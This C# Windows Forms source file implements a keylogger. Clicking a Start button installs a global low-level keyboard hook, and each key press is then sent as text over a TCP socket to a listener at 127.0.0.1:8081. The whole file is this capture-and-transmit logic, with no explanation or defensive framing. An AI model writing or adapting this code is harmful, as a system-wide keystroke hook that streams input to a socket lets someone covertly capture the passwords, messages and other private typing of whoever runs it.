using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace WindowsFormsApp2
{
    public partial class Form1 : Form
    {
        private static Socket socket;
        private static IPEndPoint iPEndPoint;

        private const int WH_KEYBOARD_LL = 13;
        private const int MW_KEYDOWN = 0x0100;

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static HookProc proc = HookCallback;
        private static IntPtr hook = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        public Form1()
        {
            InitializeComponent();
            iPEndPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8081);
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(iPEndPoint);
            FormClosing += (s, e) =>
            {
                UnhookWindowsHookEx(hook);
            };
        }

        private static IntPtr SetHook(HookProc proc, int ev)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(ev, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if ((nCode >= 0) && (wParam == (IntPtr)MW_KEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                socket.Send(System.Text.Encoding.ASCII.GetBytes(((Keys)vkCode).ToString()));
                return (IntPtr)0;
            }
            return CallNextHookEx(hook, nCode, wParam, lParam);
        }

        private void buttonStart_Click(object sender, EventArgs e)
        {
            if (hook == IntPtr.Zero)
            {
                hook = SetHook(proc, WH_KEYBOARD_LL);
            }
        }
    }
}
